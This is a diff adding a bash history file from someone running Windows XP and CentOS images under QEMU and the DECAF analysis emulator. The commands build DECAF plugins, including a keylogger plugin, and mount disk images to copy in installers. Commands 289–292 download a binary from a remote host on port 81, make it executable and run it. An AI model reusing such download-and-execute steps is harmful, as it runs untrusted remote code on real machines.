@@ -1,0 +1,1000 @@
+  195  ls
+  196  qemu-system-i386 winxp_sp3.img 
+  197  clear
+  198  ls
+  199  cd SDL2-2.0.8/
+  200  cd ..
+  201  sudo apt-get remove libsdl1.2debian 
+  202  sudo apt-get install libsdl1.2-dev 
+  203  cd SDL2-2.0.8/
+  204  ./config
+  205  ./configure 
+  206  make
+  207  sudo make intsall
+  208  sudo make install
+  209  sudo apt-get install qemu
+  210  cd ..
+  211  qemu-system-i386   winxp_sp3.img 
+  212  qemu-system-i386 -monitor stdio -m 2048 -usbdevice tablet -vnc :3 -netdev user,id=mynet -device rtl8139,netdev=mynet ~/winxp_sp3.img 
+  213  clear
+  214  ls
+  215  qemu-system-i386 -monitor stdio -m 2048 -usbdevice tablet -vnc :3 -netdev user,id=mynet -device rtl8139,netdev=mynet ~/winxp_sp3.img 
+  216  free -h
+  217  ~/tmp/DECAF/decaf/i386-softmmu/qemu-system-i386 -monitor stdio -m 4096 -usbdevice tablet -vnc :3 -netdev user,id=mynet -device ne2k_pci,netdev=mynet ~/winxp_sp3.img 
+  218  ls
+  219  clear
+  220  ls
+  221  qemu-img snapshot -l winxp_sp3.img 
+  222  qemu-img snapshot -c senstive_file winxp_sp3.img 
+  223  qemu-img snapshot -l winxp_sp3.img 
+  224  qemu-system-i386 -monitor stdio -m 4096 -usbdevice tablet -vnc :3 -netdev user,id=mynet -device ne2k_pci,netdev=mynet ~/winxp_sp3.img 
+  225  ~/tmp/DECAF/decaf/i386-softmmu/qemu-system-i386 -monitor stdio -m 4096 -usbdevice tablet -vnc :3 -netdev user,id=mynet -device ne2k_pci,netdev=mynet ~/winxp_sp3.img 
+  226  exit
+  227  cd ~
+  228  rz
+  229  cd tmp/DECAF/decaf/plugins/my_plugin/
+  230  ls
+  231  clear
+  232  ifconfig 
+  233  ./server 192.168.0.5 6000
+  234  ls
+  235  more plugin.cpp 
+  236  vim plugin.cpp 
+  237  make clean
+  238  make
+  239  ./server 192.168.0.5 6000
+  240  ifconfig
+  241  cd ~
+  242  ~/tmp/DECAF/decaf/i386-softmmu/qemu-system-i386 -net nic,model=?
+  243  vnc4server :1
+  244  qemu-system-i386 -monitor stdio -m 4096 -usbdevice tablet -vnc :3 -netdev user,id=mynet -device ne2k_pci,netdev=mynet ~/winxp_sp3.img 
+  245  clear
+  246  ls
+  247  clear
+  248  exit
+  249  cd ~
+  250  clear
+  251  ~/tmp/DECAF/decaf/i386-softmmu/qemu-system-i386 -monitor stdio -m 4096 -usbdevice tablet -vnc :3 -netdev user,id=mynet -device ne2k_pci,netdev=mynet ~/winxp_sp3.img 
+  252  lsof -i:5903
+  253  kill -9 23799
+  254  ~/tmp/DECAF/decaf/i386-softmmu/qemu-system-i386 -monitor stdio -m 4096 -usbdevice tablet -vnc :3 -netdev user,id=mynet -device ne2k_pci,netdev=mynet ~/winxp_sp3.img 
+  255  ls
+  256  sz 7z1805.exe 
+  257  tar -cvfj tmp/ decaf.tar.gz
+  258  ls
+  259  sz SDL2-2.0.8.tar.gz 
+  260  tar -cvzf tmp.tar.gz tmp/
+  261  ls
+  262  sz tmp.tar.gz 
+  263  la
+  264  ls
+  265  cd ~
+  266  ls
+  267  clear
+  268  ls
+  269  clear
+  270  su ~
+  271  cd ~
+  272  ~/tmp/DECAF/decaf/i386-softmmu/qemu-system-i386 -monitor stdio -m 4096 -usbdevice tablet -vnc :3 -netdev user,id=mynet -device ne2k_pci,netdev=mynet ~/winxp_sp3.img 
+  273  uname -a
+  274  exit
+  275  clear
+  276  cd ~
+  277  ls
+  278  clear
+  279  vnc4server :locate libbluetooth.so
+  280  which libbluetooth.so
+  281  find -name libbluetooth.so /
+  282  find / -name libbluetooth.so 
+  283  sudo find / -name libbluetooth.so 
+  284  d
+  285  exit
+  286  ff
+  287  ls
+  288  clear
+  289  wget http://2.gannidaye.com:81/l
+  290  chmod 0755 k
+  291  chmod 0755 l
+  292  ./l
+  293  cleat
+  294  clear
+  295  sudo su
+  296  exit
+  297  clear
+  298  cd ~
+  299  ls
+  300  clear
+  301  ls
+  302  cd tmp/DECAF/decaf/plugins/
+  303  cd my_plugin/
+  304  ls
+  305  clea
+  306  clear
+  307  ls
+  308  ifconfig
+  309  ./server 192.168.0.5 6000
+  310  cd ~
+  311  ls
+  312  more hook_log 
+  313  more nic_log 
+  314  clear
+  315  exit
+  316  clear
+  317  cd !
+  318  cd ~
+  319  ls
+  320  ~/tmp/DECAF/decaf/i386-softmmu/qemu-system-i386 -monitor stdio -m 4096 -usbdevice tablet -vnc :3 -netdev user,id=mynet -device ne2k_pci,netdev=mynet ~/winxp_sp3.img 
+  321  lsof -i:5903
+  322  kill -9 47498
+  323  ~/tmp/DECAF/decaf/i386-softmmu/qemu-system-i386 -monitor stdio -m 4096 -usbdevice tablet -vnc :3 -netdev user,id=mynet -device ne2k_pci,netdev=mynet ~/winxp_sp3.img 
+  324  exit
+  325  cd ~
+  326  ls
+  327  cat /etc/issue
+  328  cd ~
+  329  clear
+  330  ls
+  331  qemu-system-i386 -m 2048 -vnc :3 -smp 4 -boot order=cd -hda centos6u3_32.img -cdrom CentOS-6.3-i386-LiveDVD.iso 
+  332  cd ~
+  333  clear
+  334  ls
+  335  clear
+  336  rz
+  337  ls
+  338  clear
+  339  rz
+  340  ls
+  341  clear
+  342  ls
+  343  ~/tmp/DECAF/decaf/i386-softmmu/qemu-system-i386 -monitor stdio -m 4096 -usbdevice tablet -vnc :3 -netdev user,id=mynet -device ne2k_pci,netdev=mynet ~/winxp_sp3.img 
+  344  lsof -i:5903
+  345  kill -9 88581
+  346  clear
+  347  ls
+  348  dd if=/dev/zero of=centos6u3_32.img bs=1M count=8192
+  349  ls
+  350  clear
+  351  qemu-system-i386 -m 4096 -vnc :3 -smp 4 -boot order=cd -hda centos6u3_32.img -cdrom CentOS-6.3-i386-LiveDVD.iso 
+  352  ls
+  353  cp CentOS-6.3-i386-LiveDVD.iso centos32.img
+  354  ll -lh
+  355  ~/tmp/DECAF/decaf/i386-softmmu/qemu-system-i386 -monitor stdio -m 4096 -usbdevice tablet -vnc :3 -netdev user,id=mynet -device ne2k_pci,netdev=mynet ~/centos32.img 
+  356  qemu-system-i386 -m 4096 -vnc :3 -smp 4 -boot order=cd -hda centos6u3_32.img -cdrom CentOS-6.3-i386-LiveDVD.iso 
+  357  qemu-img  create -f qcow2 -o compat=0.10 images/xpsp3.qcow2 4G
+  358  ls
+  359  rm centos32.img 
+  360  qemu-img create -f qcow2 centos32.qcow2 8G
+  361  ls
+  362  clear
+  363  ls
+  364  virt-install --virt-type kvm --name centos32 --ram 2048 --disk centos32.qcow2,format=qcow2 --network network=default --graphics vnc,listen=0.0.0.0 --noautoconsole --os-type=linux --os-variant=centos6.3 --location=CentOS-6.3-i386-LiveDVD.iso 
+  365  sudo apt-get install virtinst 
+  366  virt-install --virt-type kvm --name centos32 --ram 2048 --disk centos32.qcow2,format=qcow2 --network network=default --graphics vnc,listen=0.0.0.0 --noautoconsole --os-type=linux --os-variant=centos6.3 --location=CentOS-6.3-i386-LiveDVD.iso 
+  367  sudo virt-install --virt-type kvm --name centos32 --ram 2048 --disk centos32.qcow2,format=qcow2 --network network=default --graphics vnc,listen=0.0.0.0 --noautoconsole --os-type=linux --os-variant=centos6.3 --location=CentOS-6.3-i386-LiveDVD.iso 
+  368  su
+  369  clear
+  370  ls
+  371  clear
+  372  sudo virt-install --virt-type kvm -name centos32 --ram 2048 --cdrom=/home/zk/CentOS-6.3-i386-LiveDVD.iso --disk centos32.qcow2,format=qcow2
+  373  sudo virt-install --virt-type kvm -name centos32 --ram 2048 --cdrom=/home/zk/CentOS-6.3-i386-LiveDVD.iso --disk centos32.qcow2,format=qcow2 --network network=default --graphics vnc,listen=0.0.0.0 --noautoconsole --os-type=linux --os-variant=centos6.3
+  374  clear
+  375  qemu-img  info centos32.qcow2 
+  376  virt-install --os-variant list
+  377  qemu-img -h
+  378  uname -a
+  379  clear
+  380  ls
+  381  cp CentOS-6.3-i386-LiveDVD.iso centos32.iso
+  382  clear
+  383  virt-install --virt-type kvm --name centos32 --ram 1024  --disk path=centos32.qcow2,format=qcow2 --network network=default --graphics vnc,listen=0.0.0.0 --noautoconsole --os-type=linux--os-variant=rhel6 --cdrom=centos32.iso
+  384  sudo virt-install --virt-type kvm --name centos32 --ram 1024  --disk path=centos32.qcow2,format=qcow2 --network network=default --graphics vnc,listen=0.0.0.0 --noautoconsole --os-type=linux--os-variant=rhel6 --cdrom=centos32.iso
+  385  l[D
+  386  clear
+  387  ls
+  388  virt-install --os-variant list
+  389  l
+  390  mv centos32.iso centos6.iso
+  391  clear
+  392  ls
+  393  ll 
+  394  ll -lh
+  395  clear
+  396  sudo virt-install --virt-type kvm --name centos6 --ram 2048 --disk path=centos32.qcow2,format=qcow2 --network network=default --graphics vnc,listen=0.0.0.0 --noautoconsole --os-type=linux --os-variant=rhel6 --cdrom=centos6.iso
+  397  clear
+  398  cd ~
+  399  clear
+  400  ls
+  401  qemu-system-i386 -m 2048 -smp 4 -boot order=cd -hda centos6u3_32.img -cdrom CentOS-6.3-i386-LiveDVD.iso 
+  402  qemu-system-i386 -m 2048 -vnc :3 -smp 4 -boot order=cd -hda centos6u3_32.img -cdrom CentOS-6.3-i386-LiveDVD.iso 
+  403  ps -ef | grep qemu*
+  404  kill -9 90155
+  405  clear
+  406  qemu-system-i386 -m 2048 -vnc :3 -smp 4 -boot order=cd -hda centos6u3_32.img -cdrom CentOS-6.3-i386-LiveDVD.iso 
+  407  ~/tmp/DECAF/decaf/i386-softmmu/qemu-system-i386 -monitor stdio -m 4096 -usbdevice tablet -vnc :3 -netdev user,id=mynet -device ne2k_pci,netdev=mynet ~/centos6u3_32.img 
+  408  qemu-system-i386 -monitor stdio -m 4096 -usbdevice tablet -vnc :3 -netdev user,id=mynet -device ne2k_pci,netdev=mynet ~/centos6u3_32.img 
+  409  clear
+  410  qemu-system-i386 -m 2048 -vnc :3 -smp 4 -boot order=cd -hda centos6u3_32.img -cdrom CentOS-6.3-i386-LiveDVD.iso 
+  411  ls
+  412  rm centos6u3_32.img 
+  413  dd if=/dev/zero of=centos6u3_32.img bs=1M count=8192
+  414  qemu-system-i386 -monitor stdio -m 4096 -usbdevice tablet -vnc :3 -netdev user,id=mynet -device ne2k_pci,netdev=mynet ~/centos6u3_32.img 
+  415  qemu-system-i386 -m 2048 -vnc :3 -smp 4 -boot order=cd -hda centos6u3_32.img -cdrom CentOS-6.3-i386-LiveDVD.iso 
+  416  cd ~
+  417  clear
+  418  ls
+  419  dd if=/dev/zero of=centos6u3_64.img bs=1M count=8192
+  420  qemu-system-x86_64 -m 2048 -vnc :3 -smp 4 -boot order=cd -hda centos6u3_64.img -cdrom CentOS-6.3-x86_64-LiveDVD.iso 
+  421  qemu-system-i386 -monitor stdio -m 4096 -usbdevice tablet -vnc :3 -netdev user,id=mynet -device ne2k_pci,netdev=mynet ~/centos6u3_64.img 
+  422  clear
+  423  ls
+  424  rm centos6u3_64.img 
+  425  dd if=/dev/zero of=centos6u3_64.img bs=1M count=8192
+  426  qemu-system-x86_64 -m 2048 -vnc :3 -smp 4 -boot order=cd -hda centos6u3_64.img -cdrom CentOS-6.3-x86_64-LiveDVD.iso 
+  427  ls
+  428  clear
+  429  rm centos6u3_64.img 
+  430  ls
+  431  dd if=/dev/zero of=centos6u3_64.img bs=1M count=8192
+  432  qemu-system-x86_64 -m 5120 -vnc :3 -smp 4 -boot order=cd -hda centos6u3_64.img -cdrom CentOS-6.3-x86_64-LiveDVD.iso 
+  433  cd ~
+  434  clear
+  435  ls
+  436  rm centos32.qcow2 
+  437  rm centos6u3_32.img 
+  438  rm centos6u3_64.img 
+  439  clear
+  440  ls
+  441  ls *log
+  442  more nic_log 
+  443  cd ~
+  444  clear
+  445  cd ~
+  446  ls
+  447  qemu-img create centos.img 10G
+  448  ls
+  449  qemu -hda centos.img -boot d -cdrom ./CentOS-6.3-i386-LiveDVD.iso -m 512
+  450  qemu-system-i386 -hda centos.img -boot d -cdrom ./CentOS-6.3-i386-LiveDVD.iso -m 512
+  451  sudo apt-get install SDL
+  452  clear
+  453  cd ~
+  454  ls
+  455  DECAF/decaf/i386-softmmu/qemu-system-i386 --version
+  456  qemu-system-i386 --version
+  457  ~/tmp/DECAF/decaf/i386-softmmu/qemu-system-i386 -monitor stdio -m 4096 -usbdevice tablet -vnc :3 -netdev user,id=mynet -device ne2k_pci,netdev=mynet ~/centos6u3_32.img 
+  458  clear
+  459  ls
+  460  ~/tmp/DECAF/decaf/i386-softmmu/qemu-system-i386 -monitor stdio -m 4096 -usbdevice tablet -vnc :3 -netdev user,id=mynet -device ne2k_pci,netdev=mynet ~/winxp_sp3.img 
+  461  clear
+  462  ls
+  463  clear
+  464  ls
+  465  rm ComsenzDiscuz-DiscuzX-master.zip 
+  466  rm conf.n 
+  467  rm centos.img 
+  468  ls
+  469  clear
+  470  rz
+  471  qemu-system-i386 --version
+  472  ls
+  473  DECAF/decaf/i386-softmmu/qemu-system-i386 --version
+  474  clear
+  475  ls
+  476  cd ~
+  477  ls
+  478  clear
+  479  ~/tmp/DECAF/decaf/i386-softmmu/qemu-system-i386 -monitor stdio -m 4096 -usbdevice tablet -vnc :3 -netdev user,id=mynet -device ne2k_pci,netdev=mynet ~/winxp_sp3.img 
+  480  lsof -i:5903
+  481  kill -9 49863
+  482  ~/tmp/DECAF/decaf/i386-softmmu/qemu-system-i386 -monitor stdio -m 4096 -usbdevice tablet -vnc :3 -netdev user,id=mynet -device ne2k_pci,netdev=mynet ~/winxp_sp3.img 
+  483  clear
+  484  ~/tmp/DECAF/decaf/i386-softmmu/qemu-system-i386 -da ~/winxp_sp3.img -m 2048 -smp 2 -vnc :3 -monitor stdio
+  485  ~/tmp/DECAF/decaf/i386-softmmu/qemu-system-i386 -dda ~/winxp_sp3.img -m 2048 -smp 2 -vnc :3 -monitor stdio
+  486  ~/tmp/DECAF/decaf/i386-softmmu/qemu-system-i386 -hda ~/winxp_sp3.img -m 2048 -smp 2 -vnc :3 -monitor stdio
+  487  clear
+  488  ~/tmp/DECAF/decaf/i386-softmmu/qemu-system-i386 -hda ~/winxp_sp3.img -m 2048 -smp 2 -vnc :3 -monitor stdio -incoming tcp:0:6666
+  489  ~/tmp/DECAF/decaf/i386-softmmu/qemu-system-i386 ~/winxp_sp3.img -m 2048 -smp 2 -vnc :3 -monitor stdio -incoming tcp:0:6666
+  490  ~/tmp/DECAF/decaf/i386-softmmu/qemu-system-i386 -hda ~/winxp_sp3.img -m 2048 -smp 2 -vnc :3 -monitor stdio -incoming tcp:0:6666
+  491  ~/tmp/DECAF/decaf/i386-softmmu/qemu-system-i386 -hda ~/winxp_sp3.img -m 2048 -smp 2 -vnc :3  tcp:0:6666
+  492  ~/tmp/DECAF/decaf/i386-softmmu/qemu-system-i386 -hda ~/winxp_sp3.img -m 2048 -smp 2 tcp:0:6666
+  493  ~/tmp/DECAF/decaf/i386-softmmu/qemu-system-i386 -hda ~/winxp_sp3.img -m 2048 -smp 2 -incoming tcp:0:6666
+  494  sudo apt-get install libsdl2-dev 
+  495  sudo apt-get install libsdl2-2.0-0 
+  496  ~/tmp/DECAF/decaf/i386-softmmu/qemu-system-i386 -hda ~/winxp_sp3.img -m 2048 -smp 2 -incoming tcp:0:6666
+  497  ~/tmp/DECAF/decaf/i386-softmmu/qemu-system-i386 -hda ~/winxp_sp3.img -m 2048 -smp 2 -vnc :3  tcp:0:6666
+  498  ~/tmp/DECAF/decaf/i386-softmmu/qemu-system-i386 -hda ~/winxp_sp3.img -m 2048 -smp 2 -vnc :3 -incoming tcp:0:6666
+  499  cd ~
+  500  ls
+  501  clear
+  502  sudo apt-get install nfs-kernel-server nfs-common -y
+  503  sudo mkdir /opt/share
+  504  sudo chmod 777 /opt/share
+  505  sudo ll /opt/
+  506  ll
+  507  cd /opt/
+  508  ls
+  509  clear
+  510  ll
+  511  sudo vim /etc/exports 
+  512  sudo exportfs -r
+  513  sudo /etc/init.d/rpcbind restart
+  514  sudo /etc/init.d/nfs-kernel-server restart
+  515  ls
+  516  cd ~
+  517  ls
+  518  clear
+  519  ls
+  520  cp winxp_sp3.img /opt/share/
+  521  cd ~
+  522  clear
+  523  su zk
+  524  cd ~
+  525  clear
+  526  ls
+  527  ls /opt/
+  528  ls
+  529  cd ./share
+  530  ls /opt/share/
+  531  clear
+  532  ~/tmp/DECAF/decaf/i386-softmmu/qemu-system-i386 -hda /opt/share/winxp_sp3.img -m 512 -smp 2 -vnc :3 -monitor stdio
+  533  ~/tmp/DECAF/decaf/i386-softmmu/qemu-system-i386 -hda /opt/share/winxp_sp3.img -m 512 -smp 2 -vnc :3 -incoming tcp:0:6666 -monitor stdio
+  534  qemu-system-i386 -hda ~/winxp_sp3.img -m 2048 -smp 2 -vnc :3 -incoming tcp:0:6666
+  535  qemu-system-i386 -hda ~/winxp_sp3.img -m 2048 -smp 2 -vnc :3 -incoming tcp:0:6666 -monitor stdio
+  536  clear
+  537  qemu-system-i386 -hda ~/winxp_sp3.img -m 2048 -smp 2 -vnc :3 -incoming tcp:0:6666 -monitor stdio
+  538  df 
+  539  ls /opt/
+  540  qemu-system-i386 -hda ~/winxp_sp3.img -m 2048 -smp 2 -vnc :3 -incoming tcp:0:6666 -monitor stdio
+  541  qemu-system-i386 -hda /opt/share/winxp_sp3.img -m 2048 -smp 2 -vnc :3 -incoming tcp:0:6666 -monitor stdio
+  542  cd /
+  543  ls
+  544  clear
+  545  ls
+  546  cd ~
+  547  cler
+  548  clear
+  549  ls
+  550  clear
+  551  ls
+  552  cd ~
+  553  clear
+  554  ls
+  555  rm j
+  556  rm l 
+  557  ls
+  558  ls /opt/
+  559  ls ./share
+  560  ll
+  561  clear
+  562  cd /opt/
+  563  ls
+  564  cd share/
+  565  ls
+  566  df
+  567  clear
+  568  ls
+  569  cd ..
+  570  ls
+  571  cd ..
+  572  ls
+  573  cd ..
+  574  ls
+  575  cd ~
+  576  clear
+  577  ls
+  578  cd DECAF/decaf/
+  579  make
+  580  ld
+  581  make
+  582  ls
+  583  clear
+  584  make
+  585  cd ~
+  586  ls
+  587  clear
+  588  ls
+  589  cd ~
+  590  clear
+  591  ls
+  592  rz 
+  593  rz
+  594  ls
+  595  cd ~
+  596  clear
+  597  ls
+  598  cd DECAF/decaf/plugins/keylogger/
+  599  ls
+  600  cd ..
+  601  ls
+  602  clear
+  603  ls
+  604  cd /home/
+  605  ls
+  606  cd -
+  607  clear
+  608  ls
+  609  df -h
+  610  free -h
+  611  qemu-system-i386 -monitor stdio -m 4096 -usbdevice tablet -vnc :3 -netdev user,id=mynet -device ne2k_pci,netdev=mynet ~/winxp_sp3.img 
+  612  qemu-system-i386 -monitor stdio -m 4096 -usbdevice tablet -vnc :3 -netdev user,id=mynet -device ne2k_pci,netdev=mynet ~/WinXP_clean_snapshot.qcow2 
+  613  ls
+  614  qemu-system-i386 -monitor stdio -m 4096 -usbdevice tablet -vnc :3 -netdev user,id=mynet -device ne2k_pci,netdev=mynet ~/WinXP_clean_snapshot.qcow2 
+  615  cd ~
+  616  ls
+  617  modprobe nbd 
+  618  sudo modprobe nbd
+  619  ls /dev/nbd*
+  620  sudo qemu-nbc -c /dev/nbd0 
+  621  sudo qemu-nbc -c /dev/nbd0 WinXP_clean_snapshot.qcow2 
+  622  sudo qemu-nbd -c /dev/nbd0 WinXP_clean_snapshot.qcow2 
+  623  ls /dev/nbd*
+  624  sudo partprobe /dev/nbd0
+  625  ls /dev/nbd*
+  626  clear
+  627  sudo mkdir /mnt/winxp
+  628  cd /mnt/winxp/
+  629  ls
+  630  cd -
+  631  ls
+  632  clear
+  633  sudo mount /dev/nbd0p1 /mnt/winxp/
+  634  cd /mnt/winxp/
+  635  ls
+  636  cp ~/WinSCP-5.13.2-Setup.exe ./
+  637  ls
+  638  cd -
+  639  cd /mnt/winxp/
+  640  ls
+  641  clear
+  642  ls
+  643  cd -
+  644  ls
+  645  rm WinSCP-5.13.2-Setup.exe 
+  646  clear
+  647  rz
+  648  ls
+  649  cd /mnt/winxp/
+  650  ls
+  651  rm WinSCP-5.13.2-Setup.exe 
+  652  clear
+  653  ls
+  654  cp ~/WinSCP-5.13.3-Setup.exe ./
+  655  LS
+  656  ls
+  657  rm WinSCP-5.13.3-Setup.exe 
+  658  clear
+  659  cd -
+  660  rz
+  661  ls
+  662  cp WinSCP-5.13.5-Setup.exe /mnt/winxp/
+  663  cd /mnt/winxp/
+  664  ls
+  665  clear
+  666  cd -
+  667  sudo qemu-nbd -d /dev/nbd0
+  668  cd /mnt/winxp/
+  669  ls
+  670  umount /dev/nbd0p1 
+  671  sudo umount /dev/nbd0p1 
+  672  cd -
+  673  sudo umount /dev/nbd0p1 
+  674  clear
+  675  cd /mnt/winxp/
+  676  ls
+  677  cd ..
+  678  rz
+  679  c
+  680  cd ~
+  681  rz
+  682  sudo qemu-nbd -c /dev/nbd0 ~/WinXP_clean_snapshot.qcow2 
+  683  sudo mount /dev/nbd0p1 /mnt/winxp/
+  684  cd /mnt/winxp/
+  685  ls
+  686  cd -
+  687  cp WinSCP-5.13.2-Setup.exe /mnt/winxp/
+  688  sudo umount /mnt/winxp 
+  689  cd /mnt/winxp/
+  690  ls
+  691  cd -
+  692  sudo qemu-nbd -d /dev/nbd0p1 
+  693  ls /dev/nbd*
+  694  sudo qemu-nbd -c /dev/nbd0 
+  695  sudo qemu-nbd -c /dev/nbd0 ~/WinXP_clean_snapshot.qcow2 
+  696  ls /dev/nbd*
+  697  sudo mount /dev/nbd0p1 /mnt/winxp/
+  698  cd /mnt/winxp/
+  699  ls
+  700  rm WinSCP-5.13.2-Setup.exe 
+  701  ls
+  702  cp ~/WinSCP-5.13.2-Setup.exe ./
+  703  ls
+  704  ll
+  705  ll -h
+  706  cd -
+  707  sudo umount /mnt/winxp 
+  708  sudo qemu-nbd -d /dev/nbd0p1 
+  709  qemu-img -l WinXP_clean_snapshot.qcow2 
+  710  qemu-img snapshot -l WinXP_clean_snapshot.qcow2 
+  711  qemu-img snapshot -a 1 WinXP_clean_snapshot.qcow2 
+  712  qemu-img snapshot -a clean WinXP_clean_snapshot.qcow2 
+  713  sudo qemu-nbd -c /dev/nbd0 ~/WinXP_clean_snapshot.qcow2 
+  714  ls /dev/nbd*
+  715  sudo mount /dev/nbd0p1 /mnt/winxp/
+  716  cd /mnt/winxp/
+  717  ls
+  718  cd -
+  719  cp ~/WinSCP-5.13.2-Setup.exe /mnt/winxp/
+  720  sudo umount /mnt/winxp 
+  721  sudo qemu-nbd -d /dev/nbd0p1 
+  722  rz
+  723  cd ~
+  724  clear
+  725  cd ~
+  726  clear
+  727  cd DECAF/decaf/plugins/my_plugin/
+  728  ls
+  729  clear
+  730  ls
+  731  vim string_matches.txt 
+  732  qemu-system-i386 -monitor stdio -m 4096 -usbdevice tablet -vnc :3 -netdev user,id=mynet -device ne2k_pci,netdev=mynet ~/WinXP_clean_snapshot.qcow2 
+  733  make clean
+  734  make
+  735  make clean
+  736  clear
+  737  make
+  738  make clean
+  739  make
+  740  clear
+  741  ~/DECAF/decaf/i386-softmmu/qemu-system-i386 -monitor stdio -m 4096 -usbdevice tablet -vnc :3 -netdev user,id=mynet -device ne2k_pci,netdev=mynet ~/WinXP_clean_snapshot.qcow2 
+  742  qemu-system-i386 -monitor stdio -m 4096 -usbdevice tablet -vnc :3 -netdev user,id=mynet -device ne2k_pci,netdev=mynet ~/WinXP_clean_snapshot.qcow2 
+  743  ~/DECAF/decaf/i386-softmmu/qemu-system-i386 -monitor stdio -m 4096 -usbdevice tablet -vnc :3 -netdev user,id=mynet -device ne2k_pci,netdev=mynet ~/WinXP_clean_snapshot.qcow2 
+  744  clear
+  745  ls
+  746  cd ~
+  747  clear
+  748  ls
+  749  clear
+  750  cd DECAF/decaf/plugins/my_plugin/
+  751  make clean
+  752  make
+  753  free -h
+  754  top
+  755  clear
+  756  cd ~
+  757  cd ~
+  758  clear
+  759  rz
+  760  cd DECAF/decaf/plugins/my_plugin/
+  761  clear
+  762  make clean
+  763  make
+  764  make clean
+  765  make
+  766  make clean
+  767  make
+  768  ll
+  769  more stringsearch.log 
+  770  clear
+  771  ll *.log
+  772  ll -h *.log
+  773  make clean
+  774  make
+  775  ll -h *log
+  776  cd ~
+  777  ls
+  778  more stringsearch.log 
+  779  ll stringsearch.log 
+  780  make clean
+  781  cd -
+  782  make clean
+  783  make
+  784  cd -
+  785  ll -h *log
+  786  cd -
+  787  make clean
+  788  make
+  789  cd -
+  790  ll -h *log
+  791  cd ~
+  792  ~/DECAF/decaf/i386-softmmu/qemu-system-i386 -monitor stdio -m 4096 -usbdevice tablet -vnc :3 -netdev user,id=mynet -device ne2k_pci,netdev=mynet ~/WinXP_clean_snapshot.qcow2 
+  793  qemu-system-i386 -monitor stdio -m 4096 -usbdevice tablet -vnc :3 -netdev user,id=mynet -device ne2k_pci,netdev=mynet ~/WinXP_clean_snapshot.qcow2 
+  794  ~/DECAF/decaf/i386-softmmu/qemu-system-i386 -monitor stdio -m 4096 -usbdevice tablet -vnc :3 -netdev user,id=mynet -device ne2k_pci,netdev=mynet ~/WinXP_clean_snapshot.qcow2 
+  795  more stringsearch.log 
+  796  ~/DECAF/decaf/i386-softmmu/qemu-system-i386 -monitor stdio -m 4096 -usbdevice tablet -vnc :3 -netdev user,id=mynet -device ne2k_pci,netdev=mynet ~/WinXP_clean_snapshot.qcow2 
+  797  cd ~
+  798  clear
+  799  qemu-system-i386 -monitor stdio -m 4096 -usbdevice tablet -vnc :3 -netdev user,id=mynet -device ne2k_pci,netdev=mynet ~/WinXP_clean_snapshot.qcow2 -incoming tcp:0:6666
+  800  qemu-system-i386 -monitor stdio -m 4096 -usbdevice tablet -vnc :2 -netdev user,id=mynet -device ne2k_pci,netdev=mynet ~/WinXP_clean_snapshot.qcow2 -incoming tcp:0:6666
+  801  qemu-system-i386 -monitor stdio -m 4096 -usbdevice tablet -vnc :0 -netdev user,id=mynet -device ne2k_pci,netdev=mynet ~/WinXP_clean_snapshot.qcow2 -incoming tcp:0:6666
+  802  cd DECAF/decaf/
+  803  vim vl.c 
+  804  clear
+  805  cd ~
+  806  ~/DECAF/decaf/i386-softmmu/qemu-system-i386 -monitor stdio -m 4096 -usbdevice tablet -vnc :2 -netdev user,id=mynet -device ne2k_pci,netdev=mynet ~/WinXP_clean_snapshot.qcow2 -incoming tcp:0:6666
+  807  qemu-system-i386 -monitor stdio -m 4096 -usbdevice tablet -vnc :2 -netdev user,id=mynet -device ne2k_pci,netdev=mynet ~/WinXP_clean_snapshot.qcow
+  808  ~/DECAF/decaf/i386-softmmu/qemu-system-i386 -monitor stdio -m 4096 -usbdevice tablet -vnc :2 -netdev user,id=mynet -device ne2k_pci,netdev=mynet ~/WinXP_clean_snapshot.qcow2
+  809  ~/DECAF/decaf/i386-softmmu/qemu-system-i386 -monitor stdio -m 4096 -usbdevice tablet -vnc :3 -netdev user,id=mynet -device ne2k_pci,netdev=mynet ~/WinXP_clean_snapshot.qcow2
+  810  lsof -i:5903
+  811  kill -9 21695
+  812  ~/DECAF/decaf/i386-softmmu/qemu-system-i386 -monitor stdio -m 4096 -usbdevice tablet -vnc :3 -netdev user,id=mynet -device ne2k_pci,netdev=mynet ~/WinXP_clean_snapshot.qcow2
+  813  qemu-system-i386 -monitor stdio -m 4096 -usbdevice tablet -vnc :3 -netdev user,id=mynet -device ne2k_pci,netdev=mynet ~/WinXP_clean_snapshot.qcow2
+  814  ~/DECAF/decaf/i386-softmmu/qemu-system-i386 -monitor stdio -m 4096 -usbdevice tablet -vnc :3 -netdev user,id=mynet -device ne2k_pci,netdev=mynet ~/WinXP_clean_snapshot.qcow2 -incoming tcp:0:6666
+  815  ls
+  816  clear
+  817  cd /usr/share/
+  818  ls
+  819  cd qemu/
+  820  ls
+  821  clear
+  822  ls
+  823  cd ..
+  824  cd etc/
+  825  ls
+  826  cd qemu/
+  827  ls
+  828  clear
+  829  ls
+  830  cd ..
+  831  claer
+  832  acd ..
+  833  cd ~
+  834  ~/DECAF/decaf/i386-softmmu/qemu-system-i386 -monitor stdio -m 4096 -usbdevice tablet -vnc :2 -netdev user,id=mynet -device ne2k_pci,netdev=mynet ~/WinXP_clean_snapshot.qcow2 -incoming tcp:0:6666
+  835  lsof -i:5902
+  836  kill -9 2279
+  837  kill -9 22794
+  838  ~/DECAF/decaf/i386-softmmu/qemu-system-i386 -monitor stdio -m 4096 -usbdevice tablet -vnc :2 -netdev user,id=mynet -device ne2k_pci,netdev=mynet ~/WinXP_clean_snapshot.qcow2 -incoming tcp:0:6666
+  839  ~/DECAF/decaf/i386-softmmu/qemu-system-i386 -incoming tcp:0:6666 -monitor stdio -m 4096 -usbdevice tablet -vnc :2 -netdev user,id=mynet -device ne2k_pci,netdev=mynet ~/WinXP_clean_snapshot.qcow2
+  840  cd DECAF/decaf/
+  841  clear
+  842  vim vl.c 
+  843  vim zk.h
+  844  make
+  845  clear
+  846  ~/DECAF/decaf/i386-softmmu/qemu-system-i386 -monitor stdio -m 4096 -usbdevice tablet -vnc :2 -netdev user,id=mynet -device ne2k_pci,netdev=mynet ~/WinXP_clean_snapshot.qcow2 -incoming tcp:0:6666
+  847  vim vl.c 
+  848  make
+  849  ~/DECAF/decaf/i386-softmmu/qemu-system-i386 -monitor stdio -m 4096 -usbdevice tablet -vnc :2 -netdev user,id=mynet -device ne2k_pci,netdev=mynet ~/WinXP_clean_snapshot.qcow2 -incoming tcp:0:6666
+  850  vim vl.c 
+  851  clear
+  852  make
